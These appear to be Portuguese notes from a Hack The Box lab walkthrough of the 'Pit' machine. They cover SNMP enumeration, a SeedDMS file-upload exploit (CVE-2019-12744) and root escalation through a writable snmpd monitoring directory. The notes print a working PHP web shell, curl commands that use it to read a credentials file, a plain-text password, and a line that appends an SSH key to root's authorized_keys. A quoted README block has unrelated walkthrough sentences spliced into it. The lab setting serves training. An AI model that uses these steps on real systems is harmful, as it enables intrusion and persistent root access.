# SNMP

Enum

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled.png)

O Nmap revela que o OpenSSH e o nginx estão a escutar nas suas portas predefinidas. Além disso, um serviço que escuta na porta 9090 está usando um certificado TLS com commonName `dms-pit.htb`.

`nmap -sU -top-ports 50 10.10.10.241`

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%201.png)

Uma verificação básica da porta UDP revela o daemon SNMP a escutar na sua porta predefinida.

SNMP

O comando `snmpwalk` pode ser utilizado para verificar o acesso SNMP utilizando a comunidade pública predefinida.

`snmpwalk -cpublic -v2c 10.10.10.241`

Uma vez que percorrer toda a árvore SNMP pode ser demasiado demorado, vamos consultar OIDs específicos, concentrando-nos nas informações que nos interessam. Começamos com informações sobre o disco:

`snmpwalk -v2c -c public 10.129.228.106 .`

Nginx

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%202.png)

Tendo descoberto o nome comum dms-pit.htb a partir da enumeração anterior, podemos adicionar uma entrada correspondente a `/etc/hosts` e depois navegar para [`http://dms-pit.htb`](http://dms-pit.htb/) :

`echo "10.10.10.241 dms-pit.htb" | sudo tee -a /etc/hosts`

Isto resulta num erro 403 Forbidden.

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%203.png)

Knowing a directory named `seeddms51x/seeddms` exists under `/var/www/html` , we try accessing it via the URL [`http://dms-pit.htb/seeddms51x/seeddms/](http://dms-pit.htb/seeddms51x/seeddms/)` . This takes us to the `SeedDMS` login screen:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%204.png)

Cockpit

Navegar para a porta 9090 leva-nos à página de login do CentOS Cockpit. Não temos nenhuma credencial válida neste momento, portanto não podemos prosseguir.

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%205.png)

Foothold

Após algumas tentativas falhadas, conseguimos obter acesso ao SeedDMS utilizando as credenciais michelle:michelle para o utilizador descoberto anteriormente

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%206.png)

Está disponível uma Nota de Atualização. 

De acordo com o ficheiro CHANGELOG em anexo, uma vulnerabilidade de Execução Remota de Comandos foi corrigida na versão 5.1.11:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%207.png)

Podemos descarregar o `SeedDMS 5.1.15` a partir daqui. O ficheiro `seeddms51x/seeddms-5.1.15/doc/README.Install.md` incluído no arquivo descarregado contém uma secção SECURITY CONSIDERATIONS que dá um exemplo de configuração .htaccess para restringir o acesso ao diretório de dados.

```python
SECURITY CONSIDERATIONS 
 
 
======================= 
 
 
 
 
A crucial point when setting up SeedDMS is the propper placement of the 
 
 
data directory. Do not place it below your document root as 
 
configured in your web server! If you do so, there is good change that 
 
attackers can easily access your documents with a regular browser. 
 
If you can't place the data directory outside of document root, that either 
 
restrict access to it with an appropriate .htaccess file or/and change 
 
the `contentOffsetDir` in `settings.xml` to something random, but ensure it 
 
is still a valid directory name. If you change contentOffsetDir then 
 
do not forget to move `data/1048576` to `data/<your random name>`. 
 
 
Example for .htaccess file in data directory 
 
---------------------------------------------- 
 
``` 
 
# line below if for Apache 2.4 
 
<ifModule mod_authz_core.c> 
 
Require all denied 
 
</ifModule> 
 
 
 
# line below if for Apache 2.2 
 
<ifModule !mod_authz_core.c> 
 
deny from all 
 
This information matches with the available PoC for CVE-2019-12744, which exploits unvalidated file upload
to the data directory. As the example clearly states, the .htaccess settings are meant for Apache, while
the web server running on the target system is nginx. As we can see by looking at the quickstart archive, this
is configured by default. We can confirm it by requesting the .htaccess file:
Since nginx ignores .htaccess files, there is a chance we might still be able to upload arbitrary files and
access them to obtain remote code execution.
Following the PoC exploit, we create the following PHP file:
Satisfy All 
 
</ifModule> 
 
 
 
# section for Apache 2.2 and 2.4 
 
<ifModule mod_autoindex.c> 
 
IndexIgnore * 
 
</ifModule> 
 
```
```

Esta informação coincide com o PoC disponível para o `CVE-2019-12744`, que explora o carregamento de ficheiros não validados para o diretório de dados. Como o exemplo indica claramente, as definições .htaccess destinam-se ao Apache, enquanto o servidor Web em execução no sistema de destino é o nginx. Como podemos ver no arquivo de início rápido, isto está configurado por defeito. Podemos confirmar isso solicitando o arquivo .htaccess:

[SeedDMS versions < 5.1.11 - Remote Command Execution](https://www.exploit-db.com/exploits/47022)

`curl [http://dms-pit.htb/seeddms51x/data/.htaccess](http://dms-pit.htb/seeddms51x/data/.htaccess)`

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%208.png)

Uma vez que o nginx ignora os ficheiros .htaccess, existe a possibilidade de conseguirmos carregar ficheiros arbitrários e aceder-lhes para obter a execução remota de código. Seguindo a exploração PoC, criamos o seguinte ficheiro PHP:

```python
<?php
 if(isset($_REQUEST['cmd'])){
  echo "<pre>";
  $cmd = ($_REQUEST['cmd']);
  system($cmd);
  echo "</pre>";
  die;
}
?>
```

Em seguida, navegamos para a pasta `Docs/Users/michelle` (onde temos permissões de escrita), seleccionamos o item de menu Adicionar documento e carregamos o ficheiro:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%209.png)

Repare que apenas os campos Nome e Ficheiro local são obrigatórios. O ficheiro foi carregado com sucesso:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2010.png)

Podemos agora obter o ID do documento (36 neste exemplo) a partir do URL da ligação:

`http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=36&showtree=1`

De acordo com o PoC, o shell da Web carregado deve estar acessível em `/data/1048576/<document id>/1.php?cmd=<comando>`.

Verificamos isso executando o comando id:

`curl http://dms-pit.htb/seeddms51x/data/1048576/36/1.php?cmd=id`

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2011.png)

Qualquer tentativa de reverse/bind shell parece ser bloqueada (possivelmente pelo SELinux), então tentamos ler arquivos interessantes. Especificamente, estamos interessados no arquivo `conf/settings.xml`:

`curl http://dms-pit.htb/seeddms51x/data/1048576/36/1.phpcmd=cat%20/var/www/html/seeddms51x/conf/settings.xml`

Entre outras coisas, o ficheiro settings.xml contém informações de acesso à base de dados:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2012.png)

A autenticação da palavra-passe SSH está desactivada, mas a palavra-passe recuperada `ied^ieY6xoquu` pode ser utilizada para iniciar sessão como michelle a partir da consola do Cockpit na porta 9090.

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2013.png)

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2014.png)

Privilege Escalation

Como observado anteriormente, o script `/usr/bin/monitor` é chamado pelo snmpd. Nós podemos lê-lo:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2015.png)

Não temos permissões de leitura ou execução no diretório `/usr/local/monitoring`, mas o sinal + na listagem de arquivos indica que as ACLs foram definidas no diretório:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2016.png)

Podemos usar readfacl para listar as ACLs disponíveis:

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2017.png)

Isto significa que temos acesso de escrita ao diretório, o que nos permite escrever scripts arbitrários e fazê-los executar (com privilégios de root) pelo snmpd. As regras do SELinux, tal como fizeram anteriormente, impedem-nos de abrir ligações TCP, por isso uma shell bind/reverse não irá funcionar. Adicionalmente, o SELinux bloqueia o acesso ao ficheiro root.txt, o que torna impossível apenas fazer echo e ler a flag via SNMP. Algo que podemos fazer, em vez disso, é escrever nossa chave SSH pública no arquivo authorized_keys do root. Criamos o seguinte script check_key.sh dentro do diretório de monitoramento:

`echo 'echo "ssh-rsa AAAAB3NzaC1y<SNIP>" >> /root/.ssh/authorized_keys' >
/usr/local/monitoring/check_key.sh`

Executamos o snmpwalk para executar o script:

`snmpwalk -v2c -c public 10.129.228.106 .`

Podemos agora fazer SSH no sistema como root .

![Untitled](SNMP%209c05bf7a34d34fa59bdc3cbbc73ace2a/Untitled%2018.png)